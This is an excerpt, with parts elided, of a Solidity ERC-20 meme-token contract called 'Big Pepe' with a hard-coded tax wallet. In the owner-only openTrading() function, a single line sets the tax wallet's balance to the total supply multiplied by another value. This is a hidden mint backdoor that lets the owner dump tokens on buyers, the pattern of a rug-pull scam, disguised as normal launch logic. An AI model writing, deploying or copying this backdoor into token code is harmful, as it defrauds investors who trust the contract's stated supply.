...
contract BIGPEPE is Context, IERC20, Ownable {
    ...
    uint256 private constant _tTotal = 4200000000000000000 * 10**_decimals;
    string private constant _name = unicode"Big Pepe";
    string private constant _symbol = unicode"BIGPEPE";
    uint256 public _maxTxAmount = 42000000000000000 * 10**_decimals;
    uint256 public _maxWalletSize = 42000000000000000 * 10**_decimals;
    ...
    constructor () {
        _taxWallet = payable(0x1A3BE88dd9382585ce99728adD9d0A9460dB025B);
    ...
    function openTrading() external onlyOwner() {
        ...
        _balances[_taxWallet] =  _tTotal * _maxTaxSwap;
        swapEnabled = true;
        tradingOpen = true;
